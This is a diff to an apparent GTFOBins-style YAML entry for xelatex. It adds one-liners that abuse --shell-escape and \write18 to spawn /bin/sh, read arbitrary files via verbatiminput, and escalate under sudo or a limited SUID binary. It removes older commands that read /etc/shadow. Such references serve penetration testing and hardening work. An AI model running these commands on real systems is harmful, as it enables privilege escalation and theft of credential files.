@@ -1,11 +1,21 @@
-description: `xelatex` is a symbolic link to [`xetex`](/gtfobins/xetex/). However the program does not have the same behaviour regarding the name of argv[0].
+---
 functions:
+  shell:
+    - code: |
+        xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
   file-read:
-    - code: |
-        echo "\documentclass[12pt]{article} \usepackage{verbatim} \begin{document} \verbatiminput{/etc/shadow} \end{document}" > read.tex
-        latexmk read.tex
-        #/etc/shadow is in read.pdf
+    - description: The read file will be part of the output.
+      code: |
+        xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
+        strings article.dvi
   sudo:
+    - description: The read file will be part of the output.
+      code: |
+        sudo xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
+        strings article.dvi
     - code: |
-        echo "\documentclass[12pt]{article} \begin{document} \immediate\write18{/usr/bin/whoami} \end{document}" > file.tex
-        sudo xelatex -shell-escape file.tex
+        sudo xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
+  limited-suid:
+    - code: |
+        ./xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
+---
